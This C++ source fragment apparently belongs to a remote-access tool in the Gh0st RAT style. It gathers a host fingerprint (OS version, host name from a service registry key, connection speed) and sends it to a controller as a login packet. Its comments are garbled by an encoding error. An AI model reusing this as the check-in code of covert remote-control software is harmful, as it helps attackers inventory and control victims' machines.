#include "stdafx.h"
#include <stdlib.h>
//#include <win>
#include "./Include/until.h"
#include "RegEditEx.h"
typedef struct  
{
	BYTE              bToken;        //����
	OSVERSIONINFOEX   OsVerInfoEx;   //�汾��Ϣ
	int               CPUClockMhz;   //CPU��Ƶ
	IN_ADDR           IPAddress;     //�洢32λ��IPv4�ĵ�ַ���ݽṹ
	char              HostName[50];  //������
	bool              bIsWevCam;     //�Ƿ�������ͷ
	DWORD             dwSpeed;       //����
}LOGININFO;


UINT GetHostRemark(LPCTSTR lpServiceName, LPTSTR lpBuffer, UINT uSize)
{
	char strSubKey[1024];
	memset(lpBuffer, 0, uSize);
	memset(strSubKey, 0, sizeof(strSubKey));
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s",lpServiceName);
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Host", REG_SZ, (char *)lpBuffer, NULL, uSize, 0);
	if (lstrlen(lpBuffer)==0)
		gethostname(lpBuffer, uSize);
	return lstrlen(lpBuffer);
}

int sendLoginInfo(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed)
{
	int nRet = SOCKET_ERROR;
	LOGININFO LoginInfo;
	//��ʼ��������
	LoginInfo.bToken = TOKEN_LOGIN;//����Ϊ��¼
	LoginInfo.bIsWevCam = false;
	LoginInfo.dwSpeed = dwSpeed;
	LoginInfo.OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((LPOSVERSIONINFOA)&LoginInfo.OsVerInfoEx);
	char hostname[256];
	GetHostRemark(strServiceName,hostname,sizeof(hostname));
	
	memcpy(&LoginInfo.HostName, hostname, sizeof(LoginInfo.HostName));

	nRet = pClient->Send((LPBYTE)&LoginInfo, sizeof(LoginInfo));
	return nRet;
}